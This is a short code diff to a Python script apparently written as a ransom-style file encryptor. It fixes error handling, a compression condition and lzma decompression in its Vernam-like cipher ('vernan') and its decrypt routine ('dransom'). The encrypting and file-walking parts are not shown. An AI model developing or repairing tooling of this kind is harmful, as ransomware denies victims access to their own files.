@@ -37,7 +37,7 @@ def vernan(string, password, mode):
                 aux += str(((int(str(ord(string[i]))) + int(str(ord(password[i]))))%127))
                 aux += "+"
             except Exception as err:
-                "nothing"
+                print(f"Error: {err}")
 
         i += 1
     if mode == "b":
@@ -47,7 +47,7 @@ def vernan(string, password, mode):
         if verbose:
             print(f"[{str(int(round(time.time() * 1000)))[6:]}] Size of encrypted file: {len(aux)/1024} kilobytes")
 
-            if compression and verbose:
+            if compression:
                  print("Encoding and compress...")
                  aux = (aux[:-1]).encode("utf-8")
                  obj = lzma.LZMAFile(mode, "wb")
@@ -114,15 +114,19 @@ def dransom(passw, ext, path):
                     os.rename(f"{files[i][2:]}", f"{files[i][2:-(len(ext)+1)]}")
                     files[i] = files[i][:-(len(ext)+1)]
             print(f"[{str(int(round(time.time() * 1000)))[6:]}] Decrypting file {files[i]}...")
-            f = open(files[i], "r+")
-            fContent = f.read()
+#            f = open(files[i], "r+")
+#            fContent = f.read()
 
 # Decompress
             if compression:
                 print("Staring decompression...")
-                with lzma.open(files[i], "r+b", "utf-8") as lzmaFile:
+                with lzma.open(files[i]) as f:
+                    fContent = f.read().decode("utf-8")
+            else:
+                f = open(files[i], "r+")
+                fContent = f.read()
 #                obj = lzma.LZMAFile(files[i], mode="r")
-                    fContent = lzmaFile.read()
+#                fContent = lzmaFile.read().decode("utf-8")
 
             fContent = fContent.split("+")
             if os.path.splitext(files[i])[1]:
